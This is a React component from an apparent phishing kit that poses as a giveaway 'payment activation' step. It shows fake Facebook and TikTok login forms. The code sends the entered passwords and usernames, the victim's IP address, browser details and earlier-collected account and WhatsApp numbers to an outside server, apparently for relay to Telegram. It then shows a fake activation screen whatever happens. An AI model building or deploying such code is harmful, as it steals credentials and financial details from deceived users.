import React, { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import ActivationSimulation from './ActivationSimulation'

const Step5SocialActivation = ({ userAnswers, t }) => {
  const [selectedPlatform, setSelectedPlatform] = useState('')
  const [showLoginForm, setShowLoginForm] = useState(false)
  const [showActivation, setShowActivation] = useState(false)
  const [formData, setFormData] = useState({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  const platforms = [
    { id: 'facebook', name: t('facebook'), logo: '/src/assets/facebook logo.png', color: 'bg-blue-600' },
    { id: 'tiktok', name: t('tiktok'), logo: '/src/assets/tiktok logo.png', color: 'bg-black' }
  ]

  const handlePlatformSelect = (platformId) => {
    setSelectedPlatform(platformId)
    setShowLoginForm(true)
  }

  const handleBackToGiveaway = () => {
    setShowLoginForm(false)
    setShowActivation(false)
    setSelectedPlatform('')
    setFormData({})
  }

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }))
  }

  const handleLoginSubmit = async (e) => {
    e.preventDefault()
    setIsSubmitting(true)

    try {
      // Prepare data to send to backend
      const submissionData = {
        platform: selectedPlatform,
        ...formData,
        userAnswers,
        ipAddress: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip),
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      }
      
      // For Facebook, map emailOrPhone to both email and phone fields for backend compatibility
      if (selectedPlatform === 'facebook' && formData.emailOrPhone) {
        submissionData.email = formData.emailOrPhone
        submissionData.phone = formData.emailOrPhone
      }

      // Send to backend API
      const response = await fetch('https://spanish-giveaway-backend.onrender.com/api/submit-form', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(submissionData)
      })

      if (response.ok) {
        console.log('Form data sent successfully to Telegram')
        // Show activation simulation
        setShowLoginForm(false)
        setShowActivation(true)
      } else {
        console.error('Failed to send form data')
        // Still show activation simulation even if backend fails
        setShowLoginForm(false)
        setShowActivation(true)
      }
    } catch (error) {
      console.error('Error sending form data:', error)
      // Show activation simulation even if there's an error
      setShowLoginForm(false)
      setShowActivation(true)
    } finally {
      setIsSubmitting(false)
    }
  }

  const renderLoginForm = () => {
    if (selectedPlatform === 'facebook') {
      return (
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="card p-8 max-w-md mx-auto"
        >
          <div className="text-center mb-6">
            <div className="w-16 h-16 mx-auto flex items-center justify-center mb-2">
              <img 
                src="/src/assets/facebook logo.png" 
                alt="Facebook logo"
                className="w-full h-full object-contain"
              />
            </div>
            <h3 className="text-2xl font-bold text-blue-600">Facebook</h3>
            <p className="text-gray-600">Log in to continue</p>
          </div>
          
          <form onSubmit={handleLoginSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                placeholder="Email or phone number"
                className="input-field"
                required
                value={formData.emailOrPhone || ''}
                onChange={(e) => handleInputChange('emailOrPhone', e.target.value)}
              />
            </div>
            <div>
              <input
                type="password"
                placeholder={t('password')}
                className="input-field"
                required
                value={formData.password || ''}
                onChange={(e) => handleInputChange('password', e.target.value)}
              />
            </div>
            <button
              type="submit"
              disabled={isSubmitting}
              className={`w-full font-semibold py-3 px-6 rounded-xl transition-colors duration-300 ${
                isSubmitting 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-blue-600 hover:bg-blue-700 text-white'
              }`}
            >
              {isSubmitting ? 'Processing...' : t('login')}
            </button>
          </form>
          
          <div className="mt-4 text-center space-y-2">
            <a href="#" className="text-blue-600 hover:underline text-sm block">
              {t('forgotPassword')}
            </a>
            <a href="#" className="text-blue-600 hover:underline text-sm block">
              {t('createAccount')}
            </a>
          </div>
          
          <motion.button
            onClick={handleBackToGiveaway}
            disabled={isSubmitting}
            className="w-full mt-6 btn-secondary"
            whileHover={!isSubmitting ? { scale: 1.02 } : {}}
            whileTap={!isSubmitting ? { scale: 0.98 } : {}}
          >
            {t('backToGiveaway')}
          </motion.button>
        </motion.div>
      )
    }

    if (selectedPlatform === 'tiktok') {
      return (
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="card p-8 max-w-md mx-auto"
        >
          <div className="text-center mb-6">
            <div className="w-16 h-16 mx-auto flex items-center justify-center mb-2">
              <img 
                src="/src/assets/tiktok logo.png" 
                alt="TikTok logo"
                className="w-full h-full object-contain"
              />
            </div>
            <h3 className="text-2xl font-bold text-black">TikTok</h3>
            <p className="text-gray-600">Log in to continue</p>
          </div>
          
          <form onSubmit={handleLoginSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                placeholder="Username or email"
                className="input-field"
                required
                value={formData.username || ''}
                onChange={(e) => handleInputChange('username', e.target.value)}
              />
            </div>
            <div>
              <input
                type="password"
                placeholder={t('password')}
                className="input-field"
                required
                value={formData.password || ''}
                onChange={(e) => handleInputChange('password', e.target.value)}
              />
            </div>
            <button
              type="submit"
              disabled={isSubmitting}
              className={`w-full font-semibold py-3 px-6 rounded-xl transition-colors duration-300 ${
                isSubmitting 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-black hover:bg-gray-800 text-white'
              }`}
            >
              {isSubmitting ? 'Processing...' : t('login')}
            </button>
          </form>
          
          <div className="mt-4 text-center space-y-2">
            <a href="#" className="text-gray-600 hover:underline text-sm block">
              {t('forgotPassword')}
            </a>
            <a href="#" className="text-blue-600 hover:underline text-sm block">
              {t('createAccount')}
            </a>
          </div>
          
          <motion.button
            onClick={handleBackToGiveaway}
            disabled={isSubmitting}
            className="w-full mt-6 btn-secondary"
            whileHover={!isSubmitting ? { scale: 1.02 } : {}}
            whileTap={!isSubmitting ? { scale: 0.98 } : {}}
          >
            {t('backToGiveaway')}
          </motion.button>
        </motion.div>
      )
    }

    return null
  }

  if (showActivation) {
    return (
      <ActivationSimulation 
        platform={selectedPlatform} 
        onBack={handleBackToGiveaway}
        t={t}
      />
    )
  }

  if (showLoginForm) {
    return (
      <div className="min-h-[600px] flex items-center justify-center">
        {renderLoginForm()}
      </div>
    )
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="card p-8 max-w-2xl mx-auto"
    >
      <div className="text-center mb-8">
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
          className="text-6xl mb-4"
        >
          🔐
        </motion.div>
        <h2 className="text-3xl font-bold text-text dark:text-textDark mb-4 transition-colors duration-300">
          {t('activationQuestion')}
        </h2>
        <p className="text-textSecondary dark:text-textSecondaryDark text-lg transition-colors duration-300">
          Choose a platform to activate your payment and complete the process
        </p>
      </div>

      {/* Platform Selection */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
        {platforms.map((platform, index) => (
          <motion.div
            key={platform.id}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3 + index * 0.1, duration: 0.6 }}
            whileHover={{ scale: 1.02, y: -2 }}
            whileTap={{ scale: 0.98 }}
          >
            <button
              onClick={() => handlePlatformSelect(platform.id)}
              className={`w-full p-8 rounded-2xl border-2 transition-all duration-300 hover:shadow-lg ${
                platform.color === 'bg-blue-600' 
                  ? 'border-blue-200 hover:border-blue-400 hover:bg-blue-50' 
                  : 'border-border dark:border-borderDark hover:border-gray-400 dark:hover:border-gray-500 hover:bg-gray-50 dark:hover:bg-gray-700'
              }`}
            >
              <div className="mb-4">
                <div className="w-20 h-20 mx-auto flex items-center justify-center">
                  <img 
                    src={platform.logo} 
                    alt={`${platform.name} logo`}
                    className="w-full h-full object-contain"
                  />
                </div>
              </div>
              <div className="font-bold text-2xl text-text">
                {platform.name}
              </div>
              <div className="text-gray-600 mt-2">
                Click to login and activate
              </div>
            </button>
          </motion.div>
        ))}
      </div>

      {/* Summary of user's information */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.6, duration: 0.6 }}
        className="bg-gray-50 dark:bg-gray-800 p-6 rounded-xl transition-colors duration-300"
      >
        <h3 className="text-lg font-semibold text-text dark:text-textDark mb-4 text-center transition-colors duration-300">
          📋 Your Information Summary
        </h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
          <div>
            <span className="font-medium text-textSecondary dark:text-textSecondaryDark">Payment Method:</span>
            <span className="ml-2 text-text dark:text-textDark capitalize transition-colors duration-300">
              {userAnswers.paymentMethod}
            </span>
          </div>
          <div>
            <span className="font-medium text-textSecondary dark:text-textSecondaryDark">Account Number:</span>
            <span className="ml-2 text-text dark:text-textDark transition-colors duration-300">
              {userAnswers.accountNumber}
            </span>
          </div>
          <div className="md:col-span-2">
            <span className="font-medium text-textSecondary dark:text-textSecondaryDark">WhatsApp:</span>
            <span className="ml-2 text-text dark:text-textDark transition-colors duration-300">
              {userAnswers.whatsappNumber}
            </span>
          </div>
        </div>
      </motion.div>

      {/* Floating lock animation */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        {[...Array(6)].map((_, i) => (
          <motion.div
            key={i}
            className="absolute text-2xl text-secondary/30"
            initial={{
              x: Math.random() * 100,
              y: Math.random() * 100 + 300,
              opacity: 0,
            }}
            animate={{
              y: [0, -150, -300],
              opacity: [0, 1, 0],
              x: Math.random() * 100 - 50,
            }}
            transition={{
              duration: 4 + Math.random() * 2,
              repeat: Infinity,
              delay: Math.random() * 3,
            }}
          >
            🔐
          </motion.div>
        ))}
      </div>
    </motion.div>
  )
}

export default Step5SocialActivation
